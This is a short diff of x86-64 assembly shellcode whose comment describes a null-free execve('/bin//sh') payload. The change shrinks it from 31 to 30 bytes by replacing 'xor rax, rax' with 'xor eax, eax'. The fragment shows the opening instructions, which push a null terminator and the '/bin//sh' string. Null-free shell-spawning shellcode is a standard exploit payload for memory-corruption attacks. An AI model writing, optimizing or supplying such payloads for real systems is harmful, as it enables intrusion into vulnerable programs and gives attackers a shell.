@@ -1,6 +1,6 @@
-; execve("/bin//sh", ["/bin//sh"], [NULL]), null-free, 31 bytes
+; execve("/bin//sh", ["/bin//sh"], [NULL]), null-free, 30 bytes
 BITS 64
-xor rax, rax
+xor eax, eax
 push rax                ; null termination
 mov rdx, 0x68732f2f6e69622f ; "/bin//sh"
 push rdx
